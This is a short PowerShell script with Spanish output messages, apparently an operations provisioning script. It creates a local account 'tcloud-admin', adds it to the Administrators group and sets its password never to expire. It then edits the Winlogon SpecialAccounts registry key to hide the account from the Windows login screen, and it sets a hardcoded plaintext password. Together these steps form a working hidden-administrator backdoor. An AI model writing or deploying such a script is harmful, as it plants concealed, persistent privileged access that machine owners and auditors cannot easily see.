
$username = "tcloud-admin"
$password = "Mov123istar24.."
$descrip = "Usado por operaciones de red cloud"

if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
    $pwd = ConvertTo-SecureString "TuContraseñaSegura" -AsPlainText -Force    
    New-LocalUser -Name $username -Password $pwd -FullName $username -Description $descrip 
    Add-LocalGroupMember -Group "Administradores" -Member $username
    Set-LocalUser -Name $username -PasswordNeverExpires $true
    Write-Output "Usuario '$username' creado y agregado al grupo Administradores."    

    $registroPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    New-ItemProperty -Path $registroPath -Name $username -Value 0 -PropertyType DWORD -Force    
    Write-Output "Actualizado registro para que usuario $username no aparezca en windows login"    
} else {
    Write-Output "El usuario '$username' ya existe."
}

